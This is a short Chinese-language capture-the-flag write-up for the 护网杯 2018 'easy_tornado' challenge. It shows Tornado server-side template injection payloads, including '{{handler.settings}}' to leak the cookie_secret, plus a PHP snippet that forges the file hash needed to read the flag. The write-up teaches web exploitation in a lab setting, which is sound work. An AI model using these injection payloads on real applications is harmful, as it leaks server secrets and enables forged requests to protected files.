# [护网杯 2018]easy_tornado
TAG:python模板tornado注入  
## 解题过程：  
![20210108105853](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108105853.png)  
```/flag.txt```  
![20210108105916](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108105916.png)  
```/welcome.txt```  
![20210108105943](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108105943.png)  
```/hints.txt```  
![20210108110013](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108110013.png)  
从这三个文件获取到的信息：  
1. ```flag```位于```fllllllllllllag```文件中
2. ```render```表示这里使用了```python```的模板，需要测试是否可以进行模板注入
3. ```url```都是由```filename```和```filehash```组成，```filehash```即为他们```filename```的md5值，当```filename```或```filehash```不匹配时，将会跳转到错误页面，所以想到需要获取```cookie_secret```来得到```filehash```  
  
测试模板注入   
Payload:```error?msg={{1}}```  
![20210108110212](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108110212.png)  
存在模板注入漏洞，进行```cookie_secret```获取  
Payload:```error?msg={{handler.settings}}```  
![20210108110559](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108110559.png)  
Cookie_secret:```80175bd5-9c16-4794-8711-80700f547073```  
计算出```filehash```  
```
<?php
$cookie_secret='80175bd5-9c16-4794-8711-80700f547073';
$filename = '/fllllllllllllag';
$go = md5($cookie_secret . md5($filename));
echo $go;
?>
```
![20210108110645](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108110645.png)  
构造payload:```file?filename=/fllllllllllllag&filehash=863d2668182073da109088281c6054f6```  
![20210108110712](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108110712.png)  